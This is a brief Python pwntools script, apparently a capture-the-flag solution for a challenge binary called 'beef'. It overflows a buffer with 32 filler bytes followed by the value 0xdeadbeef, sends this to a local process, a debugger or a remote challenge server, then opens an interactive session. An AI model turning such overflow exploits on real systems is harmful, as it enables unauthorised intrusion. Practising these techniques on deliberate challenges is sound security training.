#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./beef"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("139.144.184.150", 31337)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+78
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 0x4 * 8
payload += p64(0xdeadbeef)

p.recvuntil(":")
p.sendline(payload)

p.interactive()
